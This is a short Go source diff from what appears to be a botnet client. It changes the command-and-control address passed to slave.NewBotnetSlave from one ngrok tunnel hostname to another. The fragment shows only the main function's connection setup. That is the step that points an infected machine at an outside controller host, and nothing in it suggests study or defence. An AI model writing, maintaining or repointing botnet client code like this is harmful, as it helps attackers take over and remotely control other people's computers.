@@ -6,7 +6,7 @@ import (
 )
 
 func main() {
-	slave, err := slave.NewBotnetSlave("72eb1473.ngrok.io")
+	slave, err := slave.NewBotnetSlave("4f906e13.ngrok.io")
 	if err != nil {
 		log.Fatal(err)
 	}
